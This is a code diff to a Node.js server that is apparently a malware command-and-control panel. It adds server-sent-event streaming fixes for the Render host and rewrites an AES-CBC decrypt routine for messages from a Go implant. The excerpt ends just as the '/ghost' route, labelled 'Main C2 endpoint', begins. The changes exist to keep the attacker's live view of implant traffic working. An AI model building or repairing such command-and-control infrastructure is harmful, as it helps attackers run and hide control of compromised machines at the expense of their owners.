@@ -24,49 +24,71 @@ app.get('/events', (req, res) => {
   res.setHeader('Content-Type', 'text/event-stream');
   res.setHeader('Cache-Control', 'no-cache');
   res.setHeader('Connection', 'keep-alive');
+  // ←←← ADD THESE TWO LINES
+  res.setHeader('X-Accel-Buffering', 'no');        // <--- THIS ONE IS CRITICAL FOR RENDER
+  res.setHeader('Access-Control-Expose-Headers', '*');
+
   res.flushHeaders();
 
-  res.write(': connected\n\n');
+  res.write(': keep-alive\n\n');  // initial comment
   clients.push(res);
 
   req.on('close', () => {
-    clients.splice(clients.indexOf(res), 1);
+    clients = clients.filter(c => c !== res);
   });
 });
 
-function broadcast(data) {
+function broadcast(payload) {
+  const message = JSON.stringify(payload);  // ← stringify ONLY ONCE
   clients.forEach(client => {
     try {
-      client.write(`data: ${JSON.stringify(data)}\n\n`);
-    } catch (e) { /* ignore dead clients */ }
+      client.write(`data: ${message}\n\n`);  // ← EXACTLY this format
+    } catch (e) {
+      // dead client, ignore
+    }
   });
 }
 
 // NEW WORKING decrypt() — supports Go's IV-prepended AES-CBC
 function decrypt(b64) {
   try {
-    const encryptedData = CryptoJS.enc.Base64.parse(b64);
-    const iv = encryptedData.clone();
+    // Decode the full base64 (IV + ciphertext)
+    const data = CryptoJS.enc.Base64.parse(b64);
+
+    // Extract IV (first 16 bytes = 4 words)
+    const iv = data.clone();
     iv.sigBytes = 16;
     iv.clamp();
-    encryptedData.words.splice(0, 4);  // remove IV (4*32-bit words = 16 bytes)
-    encryptedData.sigBytes -= 16;
 
+    // Remove IV from the data
+    const ciphertext = data.clone();
+    ciphertext.words.splice(0, 4);           // remove first 4 words (16 bytes)
+    ciphertext.sigBytes -= 16;
+
+    // Decrypt
     const decrypted = CryptoJS.AES.decrypt(
-      { ciphertext: encryptedData },
-      CryptoJS.enc.Utf8.parse(AES_KEY),
+      { ciphertext: ciphertext },
+      CryptoJS.enc.Utf8.parse(AES_KEY),   // key must be exactly 32 chars/bytes
       {
         iv: iv,
         mode: CryptoJS.mode.CBC,
         padding: CryptoJS.pad.Pkcs7
       }
     );
+
     return JSON.parse(decrypted.toString(CryptoJS.enc.Utf8));
   } catch (e) {
     console.log("Decrypt failed:", e.message);
     return null;
   }
 }
+
+// Keep Render from killing SSE
+setInterval(() => {
+  clients.forEach(client => {
+    try { client.write(': ping\n\n'); } catch {}
+  });
+}, 15000);
 
 // Main C2 endpoint
 app.post('/ghost', (req, res) => {
